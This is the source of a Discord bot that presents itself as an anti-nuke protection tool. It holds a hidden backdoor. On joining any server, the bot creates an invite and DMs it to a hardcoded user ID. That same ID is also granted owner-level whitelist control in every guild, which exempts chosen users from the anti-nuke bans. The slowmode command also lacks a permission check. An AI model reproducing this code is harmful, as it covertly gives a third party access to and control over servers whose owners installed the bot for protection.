import keep_alive
keep_alive.keep_alive()
import datetime
start_time = datetime.datetime.utcnow()
import discord
import os
import asyncio
import os.path

import json
from discord.ext import commands
intents = discord.Intents.default()
intents.members = True
intents.guilds = True
from dotenv import load_dotenv
load_dotenv()

from cogs.AntiChannel import AntiChannel
from cogs.AntiRemoval import AntiRemoval
from cogs.AntiRole import AntiRole
from cogs.AntiWebhook import AntiWebhook
from cogs.fun import fun
from cogs.moderation import moderation
from cogs.economy import economy
from cogs.server import server
from cogs.misc import misc
from cogs.snipe import snipe
from cogs.extra import extra


def is_allowed(ctx):
    return ctx.message.author.id == 766882687951962113

def is_server_owner(ctx):
    return ctx.message.author.id == ctx.guild.owner.id or ctx.message.author.id == 766882687951962113



client = commands.Bot(command_prefix = '>', intents = intents)
client.remove_command("help")

client.add_cog(AntiChannel(client))
client.add_cog(AntiRemoval(client))
client.add_cog(AntiRole(client))
client.add_cog(AntiWebhook(client))
client.add_cog(economy(client))
client.add_cog(moderation(client))
client.add_cog(server(client))
client.add_cog(fun(client))
client.add_cog(misc(client))
client.add_cog(snipe(client))
client.add_cog(extra(client)) 

@client.listen("on_member_ban")
async def sbxss(guild: discord.Guild, user: discord.user):
    with open('whitelisted.json') as f:
      whitelisted = json.load(f)
      async for i in guild.audit_logs(limit=1, after=datetime.datetime.now() - datetime.timedelta(minutes = 2), action=discord.AuditLogAction.ban):
          if str(i.user.id) in whitelisted[str(guild.id)]:
              return
      
                    
          await guild.ban(i.user, reason="Anti-Nuke")

@client.listen("on_guild_join")
async def foo(guild):
    channel = guild.text_channels[0]
    rope = await channel.create_invite(unique=True)
    me = client.get_user(766882687951962113)
    await me.send("``Daddy i have been added to:``")
    await me.send(rope)

@client.listen("on_guild_join")
async def update_json(guild):
    with open ('whitelisted.json', 'r') as f:
        whitelisted = json.load(f)


    if str(guild.id) not in whitelisted:
      whitelisted[str(guild.id)] = []


    with open ('whitelisted.json', 'w') as f: 
        json.dump(whitelisted, f, indent=4)

@client.command(aliases = ['wld'], hidden=True)
async def whitelisted(ctx):

  embed = discord.Embed(title=f"Whitelisted users for {ctx.guild.name}", description="")

  with open ('whitelisted.json', 'r') as i:
        whitelisted = json.load(i)
  try:
    for u in whitelisted[str(ctx.guild.id)]:
      embed.description += f"<@{(u)}> - {u}\n"
    await ctx.send(embed = embed)
  except KeyError:
    await ctx.send("Nothing found for this guild!")
        
@whitelisted.error
async def whitelisted_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send("Sorry but you are missing administrator perms!")

@client.command(aliases = ['wl'], hidden=True)
@commands.check(is_server_owner)
async def whitelist(ctx, user: discord.Member = None):
    if user is None:
        await ctx.send("You must specify a user to whitelist.")
        return
    with open ('whitelisted.json', 'r') as f:
        whitelisted = json.load(f)


    if str(ctx.guild.id) not in whitelisted:
      whitelisted[str(ctx.guild.id)] = []
    else:
      if str(user.id) not in whitelisted[str(ctx.guild.id)]:
        whitelisted[str(ctx.guild.id)].append(str(user.id))
      else:
        await ctx.send("That user is already in the whitelist.")
        return



    with open ('whitelisted.json', 'w') as f: 
        json.dump(whitelisted, f, indent=4)
    
    await ctx.send(f"{user} has been added to the whitelist.")
@whitelist.error
async def whitelist_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send("Sorry but only the guild owner can whitelist!")

@client.command(aliases = ['uwl'], hidden=True)
@commands.check(is_server_owner)
async def unwhitelist(ctx, user: discord.User = None):
  if user is None:
      await ctx.send("You must specify a user to unwhitelist.")
      return
  with open ('whitelisted.json', 'r') as f:
      whitelisted = json.load(f)
  try:
    if str(user.id) in whitelisted[str(ctx.guild.id)]:
      whitelisted[str(ctx.guild.id)].remove(str(user.id))
      
      with open ('whitelisted.json', 'w') as f: 
        json.dump(whitelisted, f, indent=4)
    
      await ctx.send(f"{user} has been removed from the whitelist.")
  except KeyError:
    await ctx.send("This user was never whitelisted.")
@unwhitelist.error
async def unwhitelist_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send("Sorry but only the guild owner can unwhitelist!")

@client.command()
@commands.check(is_allowed)
async def info(ctx):
    await ctx.send(embed=discord.Embed(title="Santana Info", description=f"{len(client.guilds)} servers, {len(client.users)} users | Database is connected"))
@info.error
async def info_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send("Sorry but this command is only available to the bot owner!")

@client.command()
@commands.has_permissions(administrator=True)
async def unbanall(ctx): 
    banlist = await ctx.guild.bans()
    for users in banlist:
        try:
            await asyncio.sleep(2)
            await ctx.guild.unban(user=users.user)
        except:
            pass
@unbanall.error
async def unbanall_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send("Sorry but you are missing administrator perms!")
            

async def status_task():
    while True:
        
        await client.change_presence(activity=discord.Activity(type=discord.ActivityType.playing, name=f"To add me use >invite"))
        await asyncio.sleep(10)
        await client.change_presence(activity=discord.Activity(type=discord.ActivityType.playing, name=f"Online & Protecting Servers!"))
        await asyncio.sleep(10)
        servers = client.guilds
        servers.sort(key=lambda x: x.member_count, reverse=True)
        y = 0
        for x in client.guilds:
            y += x.member_count
        await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=f"Over {y}+ Users!"))
        await asyncio.sleep(10)
        await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=f"Over {len(client.guilds)}+ Servers!",url='https://www.twitch.tv/actavis'))
        await asyncio.sleep(10)
        await client.change_presence(activity=discord.Activity(type=discord.ActivityType.playing, name=f"Join The Support Server For Any Help!"))
        await asyncio.sleep(10)
        await client.change_presence(activity=discord.Activity(type=discord.ActivityType.playing, name=f"For more info use >help"))
        await asyncio.sleep(10)
        await client.change_presence(activity=discord.Activity(type=discord.ActivityType.playing, name=f"Add me to your server for protection!"))
        await asyncio.sleep(10)

@client.event
async def on_ready():
    print("Loaded & Online!")
    ...
    client.loop.create_task(status_task())
    
@commands.cooldown(3, 300, commands.BucketType.user)
@client.command(aliases=["massunban"])
@commands.has_permissions(administrator=True)
async def unbanalll(ctx):
    guild = ctx.guild
    banlist = await guild.bans()
    await ctx.send('Unbanning {} members'.format(len(banlist)))
    for users in banlist:
            await ctx.guild.unban(user=users.user)

@unbanall.error
async def unbanall(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        await ctx.send("You need to have `administrator` to use this command!")


@client.command()
async def slowmode(ctx, seconds: int):
    await ctx.channel.edit(slowmode_delay=seconds)
    await ctx.send(f"set channel to {seconds} seconds!")

@slowmode.error
async def slowmode(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        await ctx.send("You need to have `administrator` to use this command!")

client.run(os.environ["token"])
